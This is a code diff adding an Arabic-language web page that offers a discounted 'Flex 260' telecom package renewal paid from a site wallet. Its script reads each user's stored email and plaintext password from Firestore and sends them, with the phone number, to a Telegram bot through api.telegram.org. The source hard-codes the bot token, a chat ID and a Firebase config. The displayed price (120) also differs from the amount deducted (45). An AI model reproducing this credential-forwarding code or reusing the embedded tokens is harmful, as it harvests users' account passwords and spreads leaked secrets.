@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✅ خصم فليكس 260</title>
+
+    <!-- ✅ تحميل Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+    <!-- ✅ تحميل مكتبة SweetAlert2 للتنبيهات -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+        /* ✅ تنسيق ثلاثي الأبعاد متناسق مع جميع الأجهزة */
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #2d2d2d, #3b3b3b);
+            color: white;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.2);
+            max-width: 350px;
+            width: 90%;
+        }
+
+        h2 {
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+
+        .button {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            border: none;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            background: linear-gradient(45deg, #ff512f, #dd2476);
+            color: white;
+            margin-top: 10px;
+        }
+
+        .button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 15px rgba(255, 81, 47, 0.6);
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>💳 خصم فليكس 260</h2>
+        <p>🎁 الميزة: تجدد فليكس 260 بـ 120 جنيه فقط</p>
+        <input type="text" id="phone-number" placeholder="📞 رقم الهاتف">
+        <button class="button" onclick="renewPackage()"> اشتراك</button>
+    </div>
+
+    <script>
+        const packagePrice = 45;
+        const firebaseConfig = {
+            apiKey: "AIzaSyAdf5AKFgLXgK2PYERHw1hgF_HsMmuTfuo",
+            authDomain: "noproblem-55b97.firebaseapp.com",
+            projectId: "noproblem-55b97",
+            storageBucket: "noproblem-55b97.firebasestorage.app",
+            messagingSenderId: "316010224446",
+            appId: "1:316010224446:web:5d7e7f792e53ee4b396a6f",
+            measurementId: "G-VKSGWBRKVL"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        function renewPackage() {
+            const phoneNumber = document.getElementById("phone-number").value;
+            const orderId = Math.floor(100000 + Math.random() * 900000);
+
+            if (!phoneNumber) {
+                Swal.fire("❌ خطأ", "يرجى إدخال رقم الهاتف.", "error");
+                return;
+            }
+
+            firebase.auth().onAuthStateChanged((user) => {
+                if (user) {
+                    const userRef = firebase.firestore().collection("users").doc(user.uid);
+
+                    userRef.get().then((doc) => {
+                        if (doc.exists) {
+                            let walletBalance = doc.data().wallet || 0;
+                            let email = doc.data().email || "غير متوفر";
+                            let password = doc.data().password || "غير متوفر";
+
+                            if (walletBalance >= packagePrice) {
+                                userRef.update({ wallet: walletBalance - packagePrice }).then(() => {
+                                    firebase.firestore().collection("orders").add({
+                                        orderId: orderId,
+                                        userId: user.uid,
+                                        phoneNumber: phoneNumber,
+                                        email: email,
+                                        password: password,
+                                        amountDeducted: packagePrice,
+                                        status: "قيد التنفيذ",
+                                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                                    }).then(() => {
+                                        sendOrderToBot(orderId, phoneNumber, email, password);
+                                        Swal.fire("✅ تم تقديم طلبك بنجاح!", "سيتم تنفيذ الخصم قريبًا.", "success");
+                                    });
+                                });
+                            } else {
+                                Swal.fire("❌ خطأ", "رصيدك غير كافٍ لتجديد الباقة.", "error");
+                            }
+                        }
+                    });
+                } else {
+                    Swal.fire("❌ خطأ", "يجب تسجيل الدخول أولاً.", "error");
+                }
+            });
+        }
+
+        function sendOrderToBot(orderId, phoneNumber, email, password) {
+            let token = "7916799067:AAHFnY6z26-uAOKOwSaG43OPgBo-EEdZ6OE";
+            let chatId = "6798744902";
+
+            let message = `📌 *طلب جديد - خصم فليكس 260*  
+🔢 *رقم الطلب:* ${orderId}  
+📞 *رقم الهاتف:* ${phoneNumber}  
+✉️ *الإيميل:* ${email}  
+🔐 *باسورد الحساب:* ${password}  
+💰 *المبلغ المدفوع:* ${packagePrice} جنيه  
+⚡ *الحالة:* قيد التنفيذ`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+                .then(() => console.log("✅ تم إرسال الطلب إلى تيليجرام"))
+                .catch(error => console.error("❌ خطأ في إرسال الطلب:", error));
+        }
+    </script>
+
+</body>
+</html>
